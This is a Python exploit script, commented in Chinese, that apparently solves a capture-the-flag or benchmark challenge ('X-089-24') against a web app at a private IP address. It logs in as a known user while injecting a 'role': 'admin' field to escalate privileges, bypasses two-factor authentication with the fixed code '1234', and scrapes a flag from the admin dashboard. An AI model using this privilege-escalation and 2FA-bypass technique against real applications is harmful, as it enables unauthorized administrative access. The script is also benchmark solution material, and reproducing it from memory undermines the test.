#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
X-089-24 Flag Fetcher 利用脚本

直接访问/admin/login（无需验证），处理2FA后获取flag
目标：http://10.12.190.19:5003/
"""

import requests
import re
import sys
from urllib.parse import urljoin

class XBEN089Exploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

    def get_flag(self):
        """
        完整的flag获取流程
        """
        # 1. 访问admin/login（无需验证）
        login_url = urljoin(self.base_url, '/admin/login')

        try:
            response = self.session.get(login_url)
            if response.status_code != 200:
                return None
        except:
            return None

        # 提取CSRF token（如果存在）
        csrf_token = None
        csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', response.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)

        # 2. 提交登录数据到 /login 端点
        login_data = {
            'username': 'emp',
            'password': 'emppassword',
            'role': 'admin'  # 添加role参数
        }
        if csrf_token:
            login_data['csrf_token'] = csrf_token

        # 提交到 /login 而不是 /admin/login
        login_submit_url = urljoin(self.base_url, '/login')
        response = self.session.post(login_submit_url, data=login_data, allow_redirects=False)

        # 3. 处理2FA
        two_fa_url = urljoin(self.base_url, '/admin/2fa')
        response = self.session.get(two_fa_url)

        csrf_token = None
        csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', response.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)

        two_fa_data = {
            'code': '1234'
        }
        if csrf_token:
            two_fa_data['csrf_token'] = csrf_token

        response = self.session.post(two_fa_url, data=two_fa_data, allow_redirects=False)

        # 4. 访问dashboard获取flag
        dashboard_url = urljoin(self.base_url, '/admin/dashboard')
        response = self.session.get(dashboard_url)

        if response.status_code == 200:
            html_content = response.text

            # 提取flag
            flag_patterns = [
                r'flag\{[a-f0-9\-]+\}',
                r'FLAG\{[A-F0-9\-]+\}',
                r'flag\{[^}]+\}',
            ]

            for pattern in flag_patterns:
                matches = re.findall(pattern, html_content, re.IGNORECASE)
                if matches:
                    return matches[0]

            # 检查页面中是否有包含flag的整行
            lines = html_content.split('\n')
            for line in lines:
                if 'flag{' in line.lower():
                    flag_match = re.search(r'flag\{[^}]+\}', line, re.IGNORECASE)
                    if flag_match:
                        return flag_match.group(0)

        return None

def main():
    target_url = "http://10.12.190.19:5003"

    exploit = XBEN089Exploit(target_url)
    flag = exploit.get_flag()

    if flag:
        print(flag)
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()